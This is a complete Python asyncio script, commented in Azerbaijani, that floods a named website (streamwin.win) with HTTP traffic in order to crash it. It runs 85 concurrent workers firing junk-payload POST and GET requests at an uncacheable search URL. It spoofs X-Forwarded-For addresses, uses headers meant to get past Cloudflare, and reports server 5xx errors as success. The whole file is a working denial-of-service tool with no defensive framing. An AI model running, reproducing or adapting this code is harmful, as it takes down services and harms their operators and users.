import asyncio
import httpx
import random
import string
import time

# --- KONFİQURASİYA ---
TARGET_URL = "https://streamwin.win"
WORKERS = 85            # Railway üçün stabillik və güc balansı
BATCH_SIZE = 55         # Hər dalğadakı paket sayı
LARGE_DATA_SIZE = 1024  # Hər POST-da serverə göndərilən zibil datanın həcmi (bayt)

def random_junk(n):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=n))

async def fatal_strike(worker_id, client):
    print(f"[*] Fatal Worker {worker_id} - Döyüşə hazır!")
    
    # Cloudflare-in keçmək üçün modern başlıqlar
    common_headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Connection": "keep-alive",
        "X-Requested-With": "XMLHttpRequest",
        "Cache-Control": "no-store, no-cache"
    }

    while True:
        try:
            # Serverin ən ağır hissəsini (Axtarış motoru) hədəf alırıq
            # Bu URL-i keşləmək qeyri-mümkündür
            url = f"{TARGET_URL}/?s={random_junk(20)}&id={random.randint(1000, 99999)}"
            
            tasks = []
            for i in range(BATCH_SIZE):
                headers = common_headers.copy()
                headers["X-Forwarded-For"] = f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
                
                # Ağır POST hücumu (Server RAM-ını bitirir)
                if i % 2 == 0:
                    junk_payload = {"data": random_junk(LARGE_DATA_SIZE), "key": random_junk(10)}
                    tasks.append(client.post(url, headers=headers, json=junk_payload))
                # Sürətli GET hücumu (Şəbəkə kanalını bağlayır)
                else:
                    tasks.append(client.get(url, headers=headers))

            # Bütün asinxron sorğuları eyni anda serverə vur!
            responses = await asyncio.gather(*tasks, return_exceptions=True)
            
            # Əgər 502 və ya 500 xətası gəlirsə, deməli server çökür
            for r in responses:
                if hasattr(r, 'status_code') and r.status_code >= 500:
                    print(f"[!] BUM! Server Error {r.status_code} tapıldı!", end="\r")

            await asyncio.sleep(0.01) # Railway-in ban almaması üçün kiçik nəfəs

        except Exception:
            await asyncio.sleep(0.2)

async def main():
    print(f"💀 FATAL STRIKE ACTIVATED ON: {TARGET_URL}")
    print("[!] Target is being saturated with high-payload requests.")
    
    limits = httpx.Limits(max_connections=None, max_keepalive_connections=None)
    
    async with httpx.AsyncClient(
        http2=True, 
        verify=False, 
        limits=limits, 
        timeout=15.0 # Server donanda bağlantını uzun saxlayırıq
    ) as client:
        
        workers = [fatal_strike(i, client) for i in range(WORKERS)]
        await asyncio.gather(*workers)

if __name__ == "__main__":
    asyncio.run(main())
